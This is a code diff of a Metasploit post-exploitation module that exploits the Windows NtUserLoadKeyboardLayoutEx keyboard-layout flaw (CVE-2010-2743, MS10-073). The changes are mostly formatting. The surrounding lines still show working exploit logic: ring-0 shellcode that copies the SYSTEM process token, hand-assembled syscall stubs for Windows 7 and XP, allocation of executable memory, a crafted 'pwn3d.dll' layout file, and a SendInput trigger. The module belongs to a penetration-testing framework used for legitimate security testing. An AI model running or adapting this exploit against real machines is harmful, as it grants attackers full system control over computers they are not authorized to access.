@@ -7,34 +7,34 @@ require 'metasm'
 
 class MetasploitModule < Msf::Post
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Windows Escalate NtUserLoadKeyboardLayoutEx Privilege Escalation',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Escalate NtUserLoadKeyboardLayoutEx Privilege Escalation',
+        'Description' => %q{
           This module exploits the keyboard layout vulnerability exploited by Stuxnet. When
-        processing specially crafted keyboard layout files (DLLs), the Windows kernel fails
-        to validate that an array index is within the bounds of the array. By loading
-        a specially crafted keyboard layout, an attacker can execute code in Ring 0.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'Ruben Santamarta',  # First public exploit
-          'jduck'              # Metasploit module
+          processing specially crafted keyboard layout files (DLLs), the Windows kernel fails
+          to validate that an array index is within the bounds of the array. By loading
+          a specially crafted keyboard layout, an attacker can execute code in Ring 0.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Ruben Santamarta', # First public exploit
+          'jduck' # Metasploit module
         ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ],
-      'References'    =>
-        [
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'References' => [
           [ 'OSVDB', '68552' ],
           [ 'CVE', '2010-2743' ],
           [ 'MSB', 'MS10-073' ],
           [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=71&Itemid=1' ],
           [ 'EDB', '15985' ]
         ],
-      'DisclosureDate'=> '2010-10-12'
-    ))
-
+        'DisclosureDate' => '2010-10-12'
+      )
+    )
   end
 
   def run
@@ -63,28 +63,28 @@ class MetasploitModule < Msf::Post
       flink_off = 0xa0
       token_off = 0x12c
       addr = 0x41424344
-      syscall_stub = <<-EOS
-mov eax, 0x000011b6
-lea edx, [esp+4]
-int 0x2e
-ret 0x1c
-EOS
+      syscall_stub = <<~EOS
+        mov eax, 0x000011b6
+        lea edx, [esp+4]
+        int 0x2e
+        ret 0x1c
+      EOS
     else # XP
       system_pid = 4
       pid_off = 0x84
       flink_off = 0x88
       token_off = 0xc8
       addr = 0x60636261
-      syscall_stub = <<-EOS
-mov eax, 0x000011c6
-mov edx, 0x7ffe0300
-call [edx]
-ret 0x1c
-EOS
+      syscall_stub = <<~EOS
+        mov eax, 0x000011c6
+        mov edx, 0x7ffe0300
+        call [edx]
+        ret 0x1c
+      EOS
     end
 
     ring0_code =
-      #"\xcc" +
+      # "\xcc" +
       # save registers -- necessary for successful recovery
       "\x60" +
       # get EPROCESS from ETHREAD
@@ -105,7 +105,7 @@ EOS
       "\x8b\x3c\x18" +
       "\x83\xe7\xf8" +
       # re-init the various offsets
-      "\x89\xf0"  +
+      "\x89\xf0" +
       "\xbb" + "FFFF" +
       "\xb9" + "PPPP" +
       # find the target pid token
@@ -180,7 +180,7 @@ EOS
     fd.close
 
     # Can't use this atm, no handle access via stdapi :(
-    #dll_fd = session.fs.file.new(dllpath, 'rb')
+    # dll_fd = session.fs.file.new(dllpath, 'rb')
     # Instead, we'll use railgun to re-open the file
     ret = session.railgun.kernel32.CreateFileA(dllpath, GENERIC_READ, 1, nil, 3, 0, 0)
     print_status(ret.inspect)
@@ -195,7 +195,7 @@ EOS
     mem_base = addr & 0xffff0000
     mem_size = (addr & 0xffff) + 0x1000
     mem_size += (0x1000 - (mem_size % 0x1000))
-    mem = session.railgun.kernel32.VirtualAlloc(mem_base, mem_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    mem = session.railgun.kernel32.VirtualAlloc(mem_base, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     if (mem['return'] != mem_base)
       print_error("Unable to allocate RWX memory @ 0x%x" % mem_base)
       return
@@ -219,7 +219,7 @@ EOS
 
     # InitializeUnicodeStr(&uStr,L"pwn3d.dll"); -- Is this necessary?
     pKLID = mem_base
-    pStr = pKLID + (2+2+4)
+    pStr = pKLID + (2 + 2 + 4)
     kbd_name = "pwn3d.dll"
     uni_name = Rex::Text.to_unicode(kbd_name + "\x00")
     ret = session.railgun.memwrite(pStr, uni_name, uni_name.length)
@@ -248,18 +248,18 @@ EOS
     hKL = ret['return']
     print_status("Current Keyboard Layout: 0x%x" % hKL)
 
-    # _declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx(
-    #  IN HANDLE Handle,
-    #  IN DWORD offTable,
-    #  IN PUNICODE_STRING puszKeyboardName,
-    #  IN HKL hKL,
-    #  IN PUNICODE_STRING puszKLID,
-    #  IN DWORD dwKLID,
-    #  IN UINT Flags
-    # )
+# _declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx(
+#  IN HANDLE Handle,
+#  IN DWORD offTable,
+#  IN PUNICODE_STRING puszKeyboardName,
+#  IN HKL hKL,
+#  IN PUNICODE_STRING puszKLID,
+#  IN DWORD dwKLID,
+#  IN UINT Flags
+# )
 
-    # Again, railgun/meterpreter doesn't implement calling a non-dll function, so
-    # I tried to hack up this call to KiFastSystemCall, but that didn't work either...
+# Again, railgun/meterpreter doesn't implement calling a non-dll function, so
+# I tried to hack up this call to KiFastSystemCall, but that didn't work either...
 =begin
     session.railgun.add_function('ntdll', 'KiFastSystemCall', 'DWORD',
       [
@@ -278,21 +278,21 @@ EOS
 
     # Instead, we'll craft a machine code blob to setup the stack and perform
     # the system call..
-    asm = <<-EOS
-pop esi
-push 0x101
-push 0x666
-push #{"0x%x" % pKLID}
-push #{"0x%x" % hKL}
-push 0
-push 0x1ae0160
-push #{"0x%x" % hDll}
-push esi
-#{syscall_stub}
-EOS
-    #print_status("\n" + asm)
+    asm = <<~EOS
+      pop esi
+      push 0x101
+      push 0x666
+      push #{"0x%x" % pKLID}
+      push #{"0x%x" % hKL}
+      push 0
+      push 0x1ae0160
+      push #{"0x%x" % hDll}
+      push esi
+      #{syscall_stub}
+    EOS
+    # print_status("\n" + asm)
     bytes = Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string
-    #print_status("\n" + Rex::Text.to_hex_dump(bytes))
+    # print_status("\n" + Rex::Text.to_hex_dump(bytes))
 
     # Copy this new system call wrapper function into our RWX memory
     func_ptr = mem_base + 0x1000
@@ -322,7 +322,7 @@ EOS
     # Now, send some input to cause ring0 payload execution...
     print_status("Attempting to cause the ring0 payload to execute...");
     vInput = [
-      1,    # INPUT_KEYBOARD - input type
+      1, # INPUT_KEYBOARD - input type
       # KEYBDINPUT struct
       0x0,  # wVk
       0x0,  # wScan
@@ -334,7 +334,6 @@ EOS
     ].pack('VvvVVVVV')
     ret = session.railgun.user32.SendInput(1, vInput, vInput.length)
     print_status('SendInput: ' + ret.inspect)
-
   ensure
     # Clean up
     if mem_base
@@ -344,7 +343,7 @@ EOS
       end
     end
 
-    #dll_fd.close
+    # dll_fd.close
     if hDll
       ret = session.railgun.kernel32.CloseHandle(hDll)
       if not ret['return']
@@ -353,8 +352,6 @@ EOS
     end
 
     session.fs.file.rm(dllpath) if dllpath
-
   end
-
 
 end
